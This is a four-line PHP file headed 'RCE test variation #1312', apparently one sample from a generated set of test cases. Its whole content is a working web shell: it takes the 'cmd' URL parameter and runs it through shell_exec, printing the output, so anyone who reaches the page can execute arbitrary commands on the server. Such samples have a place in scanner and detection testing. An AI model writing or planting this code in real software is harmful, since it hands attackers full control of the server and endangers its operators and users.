<?php
// RCE test variation #1312
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>